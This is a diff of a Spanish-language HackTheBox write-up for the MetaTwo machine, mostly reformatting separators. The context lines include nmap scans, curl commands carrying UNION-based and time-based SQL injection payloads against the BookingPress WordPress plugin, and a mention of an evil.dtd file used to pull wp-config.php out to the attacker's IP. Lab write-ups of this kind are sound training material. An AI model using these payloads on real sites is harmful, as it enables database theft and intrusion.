@@ -14,9 +14,7 @@ Máquina easy de la plataforma HackTheBox
 
 ![](/assets/images/HTB/Metatwo-HackTheBox/metatwo-rating.webp)
 
-
 ***
-
 **Un pequeño INDICE**
 
 1. [Reconocimiento](#reconocimiento).
@@ -26,12 +24,9 @@ Máquina easy de la plataforma HackTheBox
 3. [Explotación](#explotación).
 4. [Escalada de Privilegios](#privesc). 
     * [GPG](#gpg).
-    
 ***
 
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
-
-***
 
 ## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}
 
@@ -47,14 +42,11 @@ Lanzo el escaneo con el siguiente comando:
 
 ```bash
 # Primer escaneo para sacar los puertos abiertos de la máquina
---------------------------------------------------------------
+
 nmap -p- -Pn -n --min-rate 5000 10.10.11.186 --open -vvv
 
-==============================================================
-==============================================================
-
 # Segundo escaneo para sacar la versión de lo que se ejecuta en cada puerto y lanzamiento de una serie de scripts básicos de nmap contra dichos puertos.
-----------------------------------------------------------------
+
 nmap -p80,22,21 -sCV -n 10.10.11.186
 ```
 
@@ -78,8 +70,6 @@ Añado el dominio al archivo hosts y continuo.
 A continuación procedo a enumerar el servidor web y ver que tenemos por ahí.
 
 # Enumeración [#](enumeración) {#enumeración}
-
-***
 
 ## Enumeración Web [🔢](#enum-web) {#enum-web}
 
@@ -112,24 +102,23 @@ Aquí tenemos el proceso de explotación a través de una inyección sql.
 
 ```bash
 # Prueba de Concepto
---------------------
+
 # Create a new "category" and associate it with a new "service" via the BookingPress admin menu
------------------------------------------------------
+
 (/wp-admin/admin.php?page=bookingpress_services)
 
 # Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")
---------------------------------------------------
 
 # Visit the just created page as an unauthenticated user and extract the "nonce" 
-----------------------------------------------------
+
 (view source -> search for "action:'bookingpress_front_get_category_services'")
 
 # Invoke the following curl command
------------------------------------------------------
+
 curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services_wpnonce=<ELIDQUEDEBEMOSBUSCAR>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
 
 # Time based payload:  
---------------------------------------------------------
+
 curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=<ELIDQUEDEBEMOSBUSCAR>&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH' 
 ```
 
@@ -235,6 +224,7 @@ make up-mal
 
 # Editamos el archivo evil.dtd añadiendo la ruta del archivo wp-config.php y añadiendo nuestra ip
 ```
+
 ![](/assets/images/HTB/Metatwo-HackTheBox/evildtd.webp)
 
 ```bash
